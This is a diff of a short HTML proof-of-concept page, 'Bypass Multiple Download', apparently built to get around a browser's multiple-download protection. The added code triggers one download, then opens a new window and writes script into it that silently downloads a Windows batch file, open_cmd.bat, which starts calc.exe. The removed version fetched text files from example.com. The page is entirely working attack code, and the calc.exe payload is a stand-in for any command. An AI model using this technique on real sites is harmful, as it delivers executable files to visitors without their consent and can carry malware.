@@ -1,43 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Tech 3 – Fetch external</title>
-<style>/* same */</style>
+    <meta charset="UTF-8">
+    <title>Bypass Multiple Download</title>
+    <style>
+        body { font-family: system-ui, sans-serif; max-width: 400px; margin: 40px auto; text-align: center; }
+        button { width: 100%; padding: 12px; background: #0056b3; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
+    </style>
 </head>
 <body>
-<h2>Bypass Multiple Download</h2>
-<button onclick="run()">Execute Injection</button>
-<pre id="out" style="margin:10px auto;width:100%;text-align:left;"></pre>
-<script>
-function run(){
-  // main download dari example.com
-  fetch('https://example.com/main_context.txt')
-    .then(r=>r.blob())
-    .then(blob=>{
-      const url=URL.createObjectURL(blob);
-      const a=document.createElement('a');
-      a.href=url; a.download='main_context.txt';
-      document.body.appendChild(a);a.click();document.body.removeChild(a);
-      document.getElementById('out').innerText='Main downloaded from example.com';
-    });
-  // injected download di window baru (serupia tapi sumber luar)
-  setTimeout(()=>{
-    const win=window.open('', '_blank');
-    if(win){
-      win.document.write(`<script>setTimeout(()=>{
-        fetch('https://example.com/injected_context.txt')
-          .then(r=>r.blob()).then(blob=>{
-            const a=document.createElement('a');
-            a.href=URL.createObjectURL(blob);
-            a.download='injected_context.txt';
-            document.body.appendChild(a);a.click();
-          });
-      },300);<\/script>`);
-      win.document.close();
-    }
-  },500);
-}
-</script>
+    <h2>Bypass Multiple Download</h2>
+    <button onclick="run()">Execute Injection</button>
+    <script>
+        function download(name, content) {
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(new Blob([content], { type: 'text/plain' }));
+            a.download = name;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+        function run() {
+            download('main_context.txt', '');
+            setTimeout(() => {
+                const win = window.open('', '_blank');
+                if (win) {
+                    win.document.write(`
+                        <script>
+                            function download(name, content) {
+                                const a = document.createElement('a');
+                                a.href = URL.createObjectURL(new Blob([content], { type: 'text/plain' }));
+                                a.download = name;
+                                document.body.appendChild(a);
+                                a.click();
+                                document.body.removeChild(a);
+                            }
+                            setTimeout(() => {
+                                download('open_cmd.bat', '@echo off\\r\\nstart "" calc.exe\\r\\n');
+                            }, 300);
+                        <\/script>
+                    `);
+                    win.document.close();
+                }
+            }, 500);
+        }
+    </script>
 </body>
 </html>
